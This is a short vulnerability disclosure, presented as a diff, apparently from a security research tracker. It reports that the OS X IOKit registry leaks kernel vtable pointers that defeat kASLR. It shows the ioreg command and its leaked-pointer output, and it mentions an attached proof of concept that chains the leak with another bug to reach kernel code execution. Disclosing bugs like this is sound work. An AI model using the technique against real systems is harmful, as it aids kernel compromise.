@@ -1,0 +1,13 @@
+Issue 126:	OS X kASLR defeat due to kernel pointers in IOKit registry
+
+$ ioreg -lxf | grep 7fffffff
+    | | | |   | |   "AAPL,iokit-ndrv" = <f07c3a8c7fffffff>
+    | | | |   | | |   "AAPL,iokit-ndrv" = <f07c3a8c7fffffff>
+    | | | |   | | |   "AAPL,iokit-ndrv" = <f07c3a8c7fffffff>
+    | | | |   | | |   "AAPL,iokit-ndrv" = <f07c3a8c7fffffff>
+    | | | |   | | |   "AAPL,iokit-ndrv" = <f07c3a8c7fffffff>
+    | | | | |   "AAPL,iokit-ndrv" = <f07c3a8c7fffffff>
+
+That's an IOKit vtable pointer. Read access to the IOKit registry isn't currently preventable by the OS X sandboxing mechanism so any process on OS X can read *all* the information in there.
+
+PoC exploit attached which uses this kASLR defeat along with https://code.google.com/p/google-security-research/issues/detail?id=40 to get reliable kernel code execution.
